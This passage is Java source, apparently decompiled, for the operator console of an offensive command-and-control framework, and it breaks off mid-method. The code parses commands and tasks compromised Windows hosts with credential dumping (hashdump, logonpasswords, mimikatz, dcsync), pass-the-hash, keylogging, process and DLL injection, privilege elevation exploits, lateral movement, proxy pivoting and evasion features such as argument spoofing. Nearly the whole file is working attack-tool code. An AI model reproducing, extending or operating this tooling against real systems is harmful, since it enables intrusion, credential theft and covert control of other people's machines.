package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.WindowCleanup;
import aggressor.bridges.AliasManager;
import aggressor.dialogs.ScListenerChooser;
import beacon.BeaconCommands;
import beacon.BeaconElevators;
import beacon.BeaconExploits;
import beacon.BeaconRemoteExecMethods;
import beacon.BeaconRemoteExploits;
import beacon.BeaconTabCompletion;
import beacon.Registry;
import beacon.TaskBeacon;
import common.AObject;
import common.BeaconEntry;
import common.BeaconOutput;
import common.Callback;
import common.CommandParser;
import common.CommonUtils;
import common.StringStack;
import common.TeamQueue;
import console.ActivityConsole;
import console.Colors;
import console.Console;
import console.ConsolePopup;
import console.GenericTabCompletion;
import console.StatusBar;
import cortana.Cortana;
import cortana.gui.MenuBuilder;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Stack;
import javax.swing.JTextField;

import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

public class BeaconConsole extends AObject implements ActionListener, ConsolePopup, Callback {

    protected Console console = null;
    protected TeamQueue conn = null;
    protected Cortana engine = null;
    protected DataManager data = null;
    protected WindowCleanup state = null;
    protected String bid;
    protected TaskBeacon master = null;
    protected AggressorClient client = null;

    public BeaconConsole(String string, AggressorClient aggressorClient) {
        this(string, aggressorClient, aggressorClient.getData(), aggressorClient.getScriptEngine(), aggressorClient.getConnection());
    }

    public String getPrompt() {
        return Colors.underline("beacon") + "> ";
    }

    public String Script(String string) {
        return "BEACON_" + string;
    }

    public BeaconConsole(String string, AggressorClient aggressorClient, DataManager dataManager, Cortana cortana, TeamQueue teamQueue) {
        Object object;
        this.engine = cortana;
        this.conn = teamQueue;
        this.data = dataManager;
        this.bid = string;
        this.client = aggressorClient;
        this.master = new TaskBeacon(aggressorClient, dataManager, teamQueue, new String[]{string});
        this.console = new ActivityConsole(true);
        this.console.setBeaconID(string);
        this.console.updatePrompt(getPrompt());
        this.console.getInput().addActionListener(this);
        StringBuffer stringBuffer = new StringBuffer();
        Iterator iterator = DataUtils.getBeaconTranscriptAndSubscribe(dataManager, string, this).iterator();
        while (iterator.hasNext()) {
            object = format((BeaconOutput) iterator.next());
            if (object != null) {
                stringBuffer.append((String) object + "\n");
            }
        }
        this.console.append(stringBuffer.toString());
        dataManager.subscribe("beacons", this);
        object = DataUtils.getBeacon(dataManager, string);
        if (object != null) {
            String str1 = cortana.format(Script("SBAR_LEFT"), ((BeaconEntry) object).eventArguments());
            String str2 = cortana.format(Script("SBAR_RIGHT"), ((BeaconEntry) object).eventArguments());
            this.console.getStatusBar().set(str1, str2);
        }
        getTabCompletion();
        this.console.setPopupMenu(this);
    }

    public GenericTabCompletion getTabCompletion() {
        return new BeaconTabCompletion(this.bid, this.client, this.console);
    }

    public ActionListener cleanup() {
        return this.data.unsubOnClose("beacons, beaconlog", this);
    }

    public Console getConsole() {
        return this.console;
    }

    public void result(String string, Object object) {
        BeaconOutput beaconOutput;
        String str1;
        if (string.equals("beacons") && this.console.isShowing()) {
            BeaconEntry beaconEntry = DataUtils.getBeaconFromResult(object, this.bid);
            if (beaconEntry == null) {
                return;
            }
            str1 = this.engine.format(Script("SBAR_LEFT"), beaconEntry.eventArguments());
            String str2 = this.engine.format(Script("SBAR_RIGHT"), beaconEntry.eventArguments());
            this.console.getStatusBar().left(str1);
            this.console.getStatusBar().right(str2);
        } else if (string.equals("beaconlog")) {
            beaconOutput = (BeaconOutput) object;
            if (beaconOutput.is(this.bid)) {
                str1 = format(beaconOutput);
                if (str1 != null) {
                    this.console.append(str1 + "\n");
                }
            }
        }
    }

    public String format(BeaconOutput beaconOutput) {
        return this.engine.format(beaconOutput.eventName().toUpperCase(), beaconOutput.eventArguments());
    }

    public void showPopup(String string, MouseEvent mouseEvent) {
        Stack<Scalar> stack = new Stack();
        LinkedList<String> linkedList = new LinkedList();
        linkedList.add(this.bid);
        stack.push(SleepUtils.getArrayWrapper(linkedList));
        this.engine.getMenuBuilder().installMenu(mouseEvent, "beacon", stack);
    }

    public String formatLocal(BeaconOutput beaconOutput) {
        beaconOutput.from = DataUtils.getNick(this.data);
        return format(beaconOutput);
    }

    public boolean isVistaAndLater() {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bid);
        if (beaconEntry != null) {
            return beaconEntry.getVersion() >= 6.0D;
        }
        return false;
    }

    public boolean is8AndLater() {
        BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bid);
        if (beaconEntry != null) {
            return beaconEntry.getVersion() >= 6.2D;
        }
        return false;
    }

    public void actionPerformed(ActionEvent actionEvent) {
        String str1 = actionEvent.getActionCommand().trim();
        ((JTextField) actionEvent.getSource()).setText("");
        CommandParser commandParser = new CommandParser(str1);
        if (this.client.getAliases().isAlias(commandParser.getCommand())) {
            this.master.input(str1);
            this.client.getAliases().fireCommand(this.bid, commandParser.getCommand(), commandParser.getArguments());
            return;
        }
        String str2;
        if (commandParser.is("help") || commandParser.is("?")) {
            this.console.append(formatLocal(BeaconOutput.Input(this.bid, str1)) + "\n");
            if (commandParser.verify("Z") || commandParser.reset()) {
                str2 = commandParser.popString();
                BeaconCommands beaconCommands = DataUtils.getBeaconCommands(this.data);
                if (beaconCommands.isHelpAvailable(str2)) {
                    Stack<Scalar> stack = new Stack();
                    stack.push(SleepUtils.getScalar(str2));
                    this.console.append(this.engine.format("BEACON_OUTPUT_HELP_COMMAND", stack) + "\n");
                } else {
                    commandParser.error("no help is available for '" + str2 + "'");
                }
            } else {
                this.console.append(this.engine.format("BEACON_OUTPUT_HELP", new Stack()) + "\n");
            }
            if (commandParser.hasError()) {
                this.console.append(formatLocal(BeaconOutput.Error(this.bid, commandParser.error())) + "\n");
            }
            return;
        }
        if (commandParser.is("downloads")) {
            this.console.append(formatLocal(BeaconOutput.Input(this.bid, str1)) + "\n");
            this.conn.call("beacons.downloads", CommonUtils.args(this.bid), new Callback() {

                @Override
                public void result(String string, Object object) {
                    Stack<Scalar> stack = new Stack();
                    stack.push(CommonUtils.convertAll(object));
                    stack.push(SleepUtils.getScalar(BeaconConsole.this.bid));
                    BeaconConsole.this.console.append(BeaconConsole.this.engine.format("BEACON_OUTPUT_DOWNLOADS", stack) + "\n");
                }
            });
            return;
        }
        if (commandParser.is("elevate") && commandParser.empty()) {
            this.console.append(formatLocal(BeaconOutput.Input(this.bid, str1)) + "\n");
            this.console.append(this.engine.format("BEACON_OUTPUT_EXPLOITS", new Stack()) + "\n");
            return;
        }
        if (commandParser.is("runasadmin") && commandParser.empty()) {
            this.console.append(formatLocal(BeaconOutput.Input(this.bid, str1)) + "\n");
            this.console.append(this.engine.format("BEACON_OUTPUT_ELEVATORS", new Stack()) + "\n");
            return;
        }
        if (commandParser.is("remote-exec") && commandParser.empty()) {
            this.console.append(formatLocal(BeaconOutput.Input(this.bid, str1)) + "\n");
            this.console.append(this.engine.format("BEACON_OUTPUT_REMOTE_EXEC_METHODS", new Stack()) + "\n");
            return;
        }
        if (commandParser.is("jump") && commandParser.empty()) {
            this.console.append(formatLocal(BeaconOutput.Input(this.bid, str1)) + "\n");
            this.console.append(this.engine.format("BEACON_OUTPUT_REMOTE_EXPLOITS", new Stack()) + "\n");
            return;
        }
        this.master.input(str1);
        if (commandParser.is("argue")) {
            if (!isVistaAndLater()) {
                commandParser.error("Target is not Windows Vista or later");
            } else if (commandParser.verify("AZ") || commandParser.reset()) {
                str2 = commandParser.popString();
                String str3 = commandParser.popString();
                this.master.SpoofArgsAdd(str3, str2);
            } else if (commandParser.verify("A") || commandParser.reset()) {
                str2 = commandParser.popString();
                this.master.SpoofArgsRemove(str2);
            } else {
                this.master.SpoofArgsList();
            }
        } else if (commandParser.is("blockdlls")) {
            if (!is8AndLater()) {
                commandParser.error("Target is not Windows 8 or later");
            } else if (commandParser.empty()) {
                this.master.BlockDLLs(true);
            } else if (commandParser.verify("?")) {
                this.master.BlockDLLs(commandParser.popBoolean());
            }
        } else if (commandParser.is("browserpivot")) {
            if (commandParser.verify("IX") || commandParser.reset()) {
                str2 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.BrowserPivot(n, str2);
            } else if (commandParser.verify("I") || commandParser.reset()) {
                this.master.BrowserPivot(commandParser.popInt(), "x86");
            } else if (commandParser.verify("?") && !commandParser.popBoolean()) {
                this.master.BrowserPivotStop();
            }
        } else if (commandParser.is("cancel")) {
            if (commandParser.verify("Z")) {
                this.master.Cancel(commandParser.popString());
            }
        } else if (commandParser.is("cd")) {
            if (commandParser.verify("Z")) {
                this.master.Cd(commandParser.popString());
            }
        } else if (commandParser.is("checkin")) {
            this.master.Checkin();
        } else if (commandParser.is("clear")) {
            this.master.Clear();
        } else if (commandParser.is("connect")) {
            if (commandParser.verify("AI") || commandParser.reset()) {
                int n = commandParser.popInt();
                String string7 = commandParser.popString();
                this.master.Connect(string7, n);
            } else if (commandParser.verify("Z")) {
                String string8 = commandParser.popString();
                this.master.Connect(string8);
            }
        } else if (commandParser.is("covertvpn")) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bid);
            if (commandParser.verify("AA")) {
                String string9 = commandParser.popString();
                String string10 = commandParser.popString();
                this.master.CovertVPN(string10, string9);
            } else if (commandParser.isMissingArguments() && commandParser.verify("A")) {
                String string11 = commandParser.popString();
                this.master.CovertVPN(string11, beaconEntry.getInternal());
            }
        } else if (commandParser.is("cp")) {
            if (commandParser.verify("AZ")) {
                String string12 = commandParser.popString();
                String string13 = commandParser.popString();
                this.master.Copy(string13, string12);
            }
        } else if (commandParser.is("dcsync")) {
            if (commandParser.verify("AA")) {
                String string14 = commandParser.popString();
                String string15 = commandParser.popString();
                this.master.DcSync(string15, string14);
            } else if (commandParser.isMissingArguments() && commandParser.verify("A")) {
                String string16 = commandParser.popString();
                this.master.DcSync(string16);
            }
        } else if (commandParser.is("desktop")) {
            if (commandParser.verify("IXQ") || commandParser.reset()) {
                String string17 = commandParser.popString();
                String string18 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.Desktop(n, string18, string17.equals("high"));
            } else if (commandParser.verify("IX") || commandParser.reset()) {
                String string19 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.Desktop(n, string19, true);
            } else if (commandParser.verify("IQ") || commandParser.reset()) {
                String string20 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.Desktop(n, "x86", string20.equals("high"));
            } else if (commandParser.verify("I") || commandParser.reset()) {
                int n = commandParser.popInt();
                this.master.Desktop(n, "x86", true);
            } else if (commandParser.verify("Q")) {
                String string21 = commandParser.popString();
                this.master.Desktop(string21.equals("high"));
            } else if (commandParser.isMissingArguments()) {
                this.master.Desktop(true);
            }
        } else if (commandParser.is("dllinject")) {
            if (commandParser.verify("IF")) {
                String string22 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.DllInject(n, string22);
            } else if (commandParser.isMissingArguments() && commandParser.verify("I")) {
                final int n = commandParser.popInt();
                SafeDialogs.openFile("Select Reflective DLL", null, null, false, false, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        BeaconConsole.this.master.DllInject(n, string);
                    }
                });
            }
        } else if (commandParser.is("dllload")) {
            if (commandParser.verify("IZ")) {
                String string23 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.DllLoad(n, string23);
            }
        } else if (commandParser.is("download")) {
            if (commandParser.verify("Z")) {
                this.master.Download(commandParser.popString());
            }
        } else if (commandParser.is("drives")) {
            this.master.Drives();
        } else if (commandParser.is("elevate")) {
            BeaconExploits beaconExploits = DataUtils.getBeaconExploits(this.data);
            if (commandParser.verify("AL")) {
                String string24 = commandParser.popString();
                String string25 = commandParser.popString();
                if (beaconExploits.isExploit(string25)) {
                    this.master.Elevate(string25, string24);
                } else {
                    commandParser.error("no such exploit '" + string25 + "'");
                }
            } else if (commandParser.isMissingArguments() && commandParser.verify("A")) {
                final String string26 = commandParser.popString();
                if (beaconExploits.isExploit(string26)) {
                    ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                        @Override
                        public void dialogResult(String string) {
                            BeaconConsole.this.master.Elevate(string26, string);
                        }
                    });
                    scListenerChooser.show();
                } else {
                    commandParser.error("no such exploit '" + string26 + "'");
                }
            }
        } else if (commandParser.is("execute")) {
            if (commandParser.verify("Z")) {
                this.master.Execute(commandParser.popString());
            }
        } else if (commandParser.is("execute-assembly")) {
            if (commandParser.verify("pZ")) {
                String string27 = commandParser.popString();
                String string28 = commandParser.popString();
                this.master.ExecuteAssembly(string28, string27);
            } else if (commandParser.isMissingArguments() && commandParser.verify("F")) {
                String string29 = commandParser.popString();
                this.master.ExecuteAssembly(string29, "");
            }
        } else if (commandParser.is("exit")) {
            this.master.Die();
        } else if (commandParser.is("getprivs")) {
            this.master.GetPrivs();
        } else if (commandParser.is("getsystem")) {
            this.master.GetSystem();
        } else if (commandParser.is("getuid")) {
            this.master.GetUID();
        } else if (commandParser.is("hashdump")) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bid);
            if (!beaconEntry.isAdmin()) {
                commandParser.error("this command requires administrator privileges");
            } else {
                this.master.Hashdump();
            }
        } else if (commandParser.is("inject")) {
            if (commandParser.verify("IXL") || commandParser.reset()) {
                String string30 = commandParser.popString();
                String string31 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.Inject(n, string30, string31);
            } else if (commandParser.verify("IX") || commandParser.reset()) {
                final String string32 = commandParser.popString();
                final int n = commandParser.popInt();
                ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        BeaconConsole.this.master.Inject(n, string, string32);
                    }
                });
                scListenerChooser.show();
            } else if (commandParser.verify("IL")) {
                String string33 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.Inject(n, string33, "x86");
            } else if (commandParser.isMissingArguments() && commandParser.verify("I")) {
                final int n = commandParser.popInt();
                ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        BeaconConsole.this.master.Inject(n, string, "x86");
                    }
                });
                scListenerChooser.show();
            }
        } else if (commandParser.is("inline")) {
            if (commandParser.verify("Z")) {
                this.master.InlineExecute(commandParser.popString());
            }
        } else if (commandParser.is("jobkill")) {
            if (commandParser.verify("I")) {
                int n = commandParser.popInt();
                this.master.JobKill(n);
            }
        } else if (commandParser.is("jobs")) {
            this.master.Jobs();
        } else if (commandParser.is("jump")) {
            BeaconRemoteExploits beaconRemoteExploits = DataUtils.getBeaconRemoteExploits(this.data);
            if (commandParser.verify("AAL")) {
                String string34 = commandParser.popString();
                String string35 = commandParser.popString();
                String string36 = commandParser.popString();
                if (beaconRemoteExploits.isExploit(string36)) {
                    this.master.Jump(string36, string35, string34);
                } else {
                    commandParser.error("no such exploit '" + string36 + "'");
                }
            } else if (commandParser.isMissingArguments() && commandParser.verify("AA")) {
                final String string37 = commandParser.popString();
                final String string38 = commandParser.popString();
                if (beaconRemoteExploits.isExploit(string38)) {
                    ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                        @Override
                        public void dialogResult(String string) {
                            BeaconConsole.this.master.Jump(string38, string37, string);
                        }
                    });
                    scListenerChooser.show();
                } else {
                    commandParser.error("no such exploit '" + string38 + "'");
                }
            }
        } else if (commandParser.is("kerberos_ticket_purge")) {
            this.master.KerberosTicketPurge();
        } else if (commandParser.is("kerberos_ccache_use") && commandParser.empty()) {
            SafeDialogs.openFile("Select ticket to use", null, null, false, false, new SafeDialogCallback() {

                @Override
                public void dialogResult(String string) {
                    BeaconConsole.this.master.KerberosCCacheUse(string);
                }
            });
        } else if (commandParser.is("kerberos_ccache_use")) {
            if (commandParser.verify("F")) {
                this.master.KerberosCCacheUse(commandParser.popString());
            }
        } else if (commandParser.is("kerberos_ticket_use") && commandParser.empty()) {
            SafeDialogs.openFile("Select ticket to use", null, null, false, false, new SafeDialogCallback() {

                @Override
                public void dialogResult(String string) {
                    BeaconConsole.this.master.KerberosTicketUse(string);
                }
            });
        } else if (commandParser.is("kerberos_ticket_use")) {
            if (commandParser.verify("F")) {
                this.master.KerberosTicketUse(commandParser.popString());
            }
        } else if (commandParser.is("keylogger")) {
            if (commandParser.empty()) {
                this.master.KeyLogger();
            } else if (commandParser.verify("IX") || commandParser.reset()) {
                String string39 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.KeyLogger(n, string39);
            } else if (commandParser.verify("I")) {
                this.master.KeyLogger(commandParser.popInt(), "x86");
            }
        } else if (commandParser.is("kill")) {
            if (commandParser.verify("I")) {
                this.master.Kill(commandParser.popInt());
            }
        } else if (commandParser.is("link")) {
            if (commandParser.verify("AA") || commandParser.reset()) {
                String string40 = commandParser.popString();
                String string41 = commandParser.popString();
                this.master.Link("\\\\" + string41 + "\\pipe\\" + string40);
            } else if (commandParser.verify("Z")) {
                String string42 = commandParser.popString();
                String string43 = DataUtils.getDefaultPipeName(this.client.getData(), string42);
                this.master.Link(string43);
            }
        } else if (commandParser.is("logonpasswords")) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bid);
            if (!beaconEntry.isAdmin()) {
                commandParser.error("this command requires administrator privileges");
            } else {
                this.master.LogonPasswords();
            }
        } else if (commandParser.is("ls")) {
            if (commandParser.verify("Z") || commandParser.reset()) {
                this.master.Ls(commandParser.popString());
            } else {
                this.master.Ls(".");
            }
        } else if (commandParser.is("make_token")) {
            if (commandParser.verify("AZ")) {
                String string44 = commandParser.popString();
                String string45 = commandParser.popString();
                if (string45.indexOf("\\") == -1) {
                    this.master.LoginUser(".", string45, string44);
                } else {
                    StringStack stringStack = new StringStack(string45, "\\");
                    String string46 = stringStack.shift();
                    String string47 = stringStack.shift();
                    this.master.LoginUser(string46, string47, string44);
                }
            }
        } else if (commandParser.is("message")) {
            if (commandParser.verify("Z")) {
                this.master.Message(commandParser.popString());
            }
        } else if (commandParser.is("mimikatz")) {
            if (commandParser.verify("Z")) {
                this.master.Mimikatz(commandParser.popString());
            }
        } else if (commandParser.is("mkdir")) {
            if (commandParser.verify("Z")) {
                this.master.MkDir(commandParser.popString());
            }
        } else if (commandParser.is("mode")) {
            if (commandParser.verify("C")) {
                String string48 = commandParser.popString();
                if (string48.equals("dns")) {
                    this.master.ModeDNS();
                } else if (string48.equals("dns6")) {
                    this.master.ModeDNS6();
                } else if (string48.equals("dns-txt")) {
                    this.master.ModeDNS_TXT();
                } else if (string48.equals("http")) {
                    this.master.ModeHTTP();
                }
            }
        } else if (commandParser.is("mv")) {
            if (commandParser.verify("AZ")) {
                String string49 = commandParser.popString();
                String string50 = commandParser.popString();
                this.master.Move(string50, string49);
            }
        } else if (commandParser.is("net")) {
            if (commandParser.verify("VZ")) {
                commandParser.popString();
                String string51 = commandParser.popString();
                commandParser.reset();
                if (CommonUtils.contains("computers, dclist, domain_controllers, domain_trusts, view", string51)) {
                    commandParser.verify("VZ");
                    String string52 = commandParser.popString();
                    String string53 = commandParser.popString();
                    this.master.NetView(string53, string52, null);
                } else if (CommonUtils.contains("group, localgroup, user", string51)) {
                    if (commandParser.verify("VAZ")) {
                        commandParser.reset();
                        if (commandParser.verify("VUZ")) {
                            String string54 = commandParser.popString();
                            String string55 = commandParser.popString();
                            String string56 = commandParser.popString();
                            this.master.NetView(string56, string55, string54);
                        }
                    } else if (commandParser.isMissingArguments() && commandParser.verify("VZ")) {
                        commandParser.reset();
                        if (commandParser.verify("VU") || commandParser.reset()) {
                            String string57 = commandParser.popString();
                            String string58 = commandParser.popString();
                            this.master.NetView(string58, string57, null);
                        } else if (commandParser.verify("VZ")) {
                            String string59 = commandParser.popString();
                            String string60 = commandParser.popString();
                            this.master.NetView(string60, "localhost", string59);
                        }
                    }
                } else if (CommonUtils.contains("share, sessions, logons, time", string51) && commandParser.verify("VU")) {
                    String string61 = commandParser.popString();
                    String string62 = commandParser.popString();
                    this.master.NetView(string62, string61, null);
                }
            } else if (commandParser.isMissingArguments() && commandParser.verify("V")) {
                String string63 = commandParser.popString();
                if (CommonUtils.contains("computers, dclist, domain_controllers, domain_trusts, view", string63)) {
                    this.master.NetView(string63, null, null);
                } else {
                    this.master.NetView(string63, "localhost", null);
                }
            }
        } else if (commandParser.is("note")) {
            if (commandParser.verify("Z")) {
                String string64 = commandParser.popString();
                this.master.Note(string64);
            } else if (commandParser.isMissingArguments()) {
                this.master.Note("");
            }
        } else if (commandParser.is("portscan")) {
            if (commandParser.verify("TRDI")) {
                int n = commandParser.popInt();
                String string65 = commandParser.popString();
                String string66 = commandParser.popString();
                String string67 = commandParser.popString();
                this.master.PortScan(string67, string66, string65, n);
            } else if (commandParser.isMissingArguments() && commandParser.verify("TRD")) {
                String string68 = commandParser.popString();
                String string69 = commandParser.popString();
                String string70 = commandParser.popString();
                this.master.PortScan(string70, string69, string68, 1024);
            } else if (commandParser.isMissingArguments() && commandParser.verify("TR")) {
                String string71 = commandParser.popString();
                String string72 = commandParser.popString();
                this.master.PortScan(string72, string71, "icmp", 1024);
            } else if (commandParser.isMissingArguments() && commandParser.verify("T")) {
                String string73 = commandParser.popString();
                this.master.PortScan(string73, "1-1024,3389,5900-6000", "icmp", 1024);
            }
        } else if (commandParser.is("powerpick")) {
            if (commandParser.verify("Z")) {
                this.master.PowerShellUnmanaged(commandParser.popString());
            }
        } else if (commandParser.is("powershell")) {
            if (commandParser.verify("Z")) {
                this.master.PowerShell(commandParser.popString());
            }
        } else if (commandParser.is("powershell-import") && commandParser.empty()) {
            SafeDialogs.openFile("Select script to import", null, null, false, false, new SafeDialogCallback() {

                @Override
                public void dialogResult(String string) {
                    BeaconConsole.this.master.PowerShellImport(string);
                }
            });
        } else if (commandParser.is("powershell-import")) {
            if (commandParser.verify("f")) {
                this.master.PowerShellImport(commandParser.popString());
            }
        } else if (commandParser.is("ppid")) {
            if (!this.isVistaAndLater()) {
                commandParser.error("Target is not Windows Vista or later");
            } else if (commandParser.verify("I")) {
                this.master.PPID(commandParser.popInt());
            } else if (commandParser.isMissingArguments()) {
                this.master.PPID(0);
            }
        } else if (commandParser.is("ps")) {
            this.master.Ps();
        } else if (commandParser.is("psinject")) {
            if (commandParser.verify("IXZ")) {
                String string74 = commandParser.popString();
                String string75 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.PsInject(n, string75, string74);
            }
        } else if (commandParser.is("pth")) {
            BeaconEntry beaconEntry = DataUtils.getBeacon(this.data, this.bid);
            if (!beaconEntry.isAdmin()) {
                commandParser.error("this command requires administrator privileges");
            } else if (commandParser.verify("AH")) {
                String string76 = commandParser.popString();
                String string77 = commandParser.popString();
                if (string77.indexOf("\\") == -1) {
                    this.master.PassTheHash(".", string77, string76);
                } else {
                    StringStack stringStack = new StringStack(string77, "\\");
                    String string78 = stringStack.shift();
                    String string79 = stringStack.shift();
                    this.master.PassTheHash(string78, string79, string76);
                }
            }
        } else if (commandParser.is("pwd")) {
            this.master.Pwd();
        } else if (commandParser.is("reg")) {
            if (commandParser.verify("gXZ")) {
                String string80;
                String string81 = commandParser.popString();
                String string82 = commandParser.popString();
                Registry registry = new Registry(string82, string81, "queryv".equals(string80 = commandParser.popString()));
                if (!registry.isValid()) {
                    commandParser.error(registry.getError());
                } else if ("queryv".equals(string80)) {
                    this.master.RegQueryValue(registry);
                } else if ("query".equals(string80)) {
                    this.master.RegQuery(registry);
                }
            }
        } else if (commandParser.is("remote-exec")) {
            BeaconRemoteExecMethods beaconRemoteExecMethods = DataUtils.getBeaconRemoteExecMethods(this.data);
            if (commandParser.verify("AAZ")) {
                String string83 = commandParser.popString();
                String string84 = commandParser.popString();
                String string85 = commandParser.popString();
                if (beaconRemoteExecMethods.isRemoteExecMethod(string85)) {
                    this.master.RemoteExecute(string85, string84, string83);
                } else {
                    commandParser.error("no such method '" + string85 + "'");
                }
            }
        } else if (commandParser.is("rev2self")) {
            this.master.Rev2Self();
        } else if (commandParser.is("rm")) {
            if (commandParser.verify("Z")) {
                this.master.Rm(commandParser.popString());
            }
        } else if (commandParser.is("rportfwd")) {
            if (commandParser.verify("IAI") || commandParser.reset()) {
                int n = commandParser.popInt();
                String string86 = commandParser.popString();
                int n2 = commandParser.popInt();
                this.master.PortForward(n2, string86, n);
            } else if (commandParser.verify("AI")) {
                int n = commandParser.popInt();
                String string87 = commandParser.popString();
                if (!"stop".equals(string87)) {
                    commandParser.error("only acceptable argument is stop");
                } else {
                    this.master.PortForwardStop(n);
                }
            }
        } else if (commandParser.is("run")) {
            if (commandParser.verify("Z")) {
                this.master.Run(commandParser.popString());
            }
        } else if (commandParser.is("runas")) {
            if (commandParser.verify("AAZ")) {
                String string88 = commandParser.popString();
                String string89 = commandParser.popString();
                String string90 = commandParser.popString();
                if (string90.indexOf("\\") == -1) {
                    this.master.RunAs(".", string90, string89, string88);
                } else {
                    StringStack stringStack = new StringStack(string90, "\\");
                    String string91 = stringStack.shift();
                    String string92 = stringStack.shift();
                    this.master.RunAs(string91, string92, string89, string88);
                }
            }
        } else if (commandParser.is("runasadmin")) {
            BeaconElevators beaconElevators = DataUtils.getBeaconElevators(this.data);
            if (commandParser.verify("AZ")) {
                String string93 = commandParser.popString();
                String string94 = commandParser.popString();
                if (beaconElevators.isElevator(string94)) {
                    this.master.ElevateCommand(string94, string93);
                } else {
                    commandParser.error("no such exploit '" + string94 + "'");
                }
            }
        } else if (commandParser.is("runu")) {
            if (!this.isVistaAndLater()) {
                commandParser.error("Target is not Windows Vista or later");
            } else if (commandParser.verify("IZ")) {
                String string95 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.RunUnder(n, string95);
            }
        } else if (commandParser.is("screenshot")) {
            if (commandParser.verify("IXI") || commandParser.reset()) {
                int n = commandParser.popInt();
                String string96 = commandParser.popString();
                int n3 = commandParser.popInt();
                this.master.Screenshot(n3, string96, n);
            } else if (commandParser.verify("IX") || commandParser.reset()) {
                String string97 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.Screenshot(n, string97, 0);
            } else if (commandParser.verify("II") || commandParser.reset()) {
                int n = commandParser.popInt();
                int n4 = commandParser.popInt();
                this.master.Screenshot(n4, "x86", n);
            } else if (commandParser.verify("I") || commandParser.reset()) {
                int n = commandParser.popInt();
                this.master.Screenshot(n, "x86", 0);
            } else {
                this.master.Screenshot(0);
            }
        } else if (commandParser.is("setenv")) {
            if (commandParser.verify("AZ")) {
                String string98 = commandParser.popString();
                String string99 = commandParser.popString();
                this.master.SetEnv(string99, string98);
            } else if (commandParser.isMissingArguments() && commandParser.verify("A")) {
                String string100 = commandParser.popString();
                this.master.SetEnv(string100, null);
            }
        } else if (commandParser.is("shell")) {
            if (commandParser.verify("Z")) {
                this.master.Shell(commandParser.popString());
            }
        } else if (commandParser.is("sleep")) {
            if (commandParser.verify("I%") || commandParser.reset()) {
                int n = commandParser.popInt();
                int n5 = commandParser.popInt();
                this.master.Sleep(n5, n);
            } else if (commandParser.verify("I")) {
                this.master.Sleep(commandParser.popInt(), 0);
            }
        } else if (commandParser.is("socks")) {
            if (commandParser.verify("I") || commandParser.reset()) {
                this.master.SocksStart(commandParser.popInt());
            } else if (commandParser.verify("Z")) {
                if (!commandParser.popString().equals("stop")) {
                    commandParser.error("only acceptable argument is stop or port");
                } else {
                    this.master.SocksStop();
                }
            }
        } else if (commandParser.is("spawn")) {
            if (commandParser.empty()) {
                ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        BeaconConsole.this.master.Spawn(string);
                    }
                });
                scListenerChooser.show();
            } else if (commandParser.verify("XL") || commandParser.reset()) {
                String string101 = commandParser.popString();
                String string102 = commandParser.popString();
                this.master.Spawn(string101, string102);
            } else if (commandParser.verify("X") || commandParser.reset()) {
                final String string103 = commandParser.popString();
                ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        BeaconConsole.this.master.Spawn(string, string103);
                    }
                });
                scListenerChooser.show();
            } else if (commandParser.verify("L")) {
                this.master.Spawn(commandParser.popString());
            }
        } else if (commandParser.is("spawnas")) {
            if (commandParser.verify("AAL")) {
                String string104 = commandParser.popString();
                String string105 = commandParser.popString();
                String string106 = commandParser.popString();
                if (string106.indexOf("\\") == -1) {
                    this.master.SpawnAs(".", string106, string105, string104);
                } else {
                    StringStack stringStack = new StringStack(string106, "\\");
                    String string107 = stringStack.shift();
                    String string108 = stringStack.shift();
                    this.master.SpawnAs(string107, string108, string105, string104);
                }
            } else if (commandParser.isMissingArguments() && commandParser.verify("AA")) {
                final String string109 = commandParser.popString();
                final String string110 = commandParser.popString();
                ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                    @Override
                    public void dialogResult(String string) {
                        if (string110.indexOf("\\") == -1) {
                            BeaconConsole.this.master.SpawnAs(".", string110, string109, string);
                        } else {
                            StringStack stringStack = new StringStack(string110, "\\");
                            String string2 = stringStack.shift();
                            String string3 = stringStack.shift();
                            BeaconConsole.this.master.SpawnAs(string2, string3, string109, string);
                        }
                    }
                });
                scListenerChooser.show();
            }
        } else if (commandParser.is("spawnu")) {
            if (commandParser.verify("IL")) {
                String string111 = commandParser.popString();
                int n = commandParser.popInt();
                this.master.SpawnUnder(n, string111);
            } else if (commandParser.isMissingArguments() && commandParser.verify("I")) {
                final int n = commandParser.popInt();
                ScListenerChooser scListenerChooser = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {

                    @Override
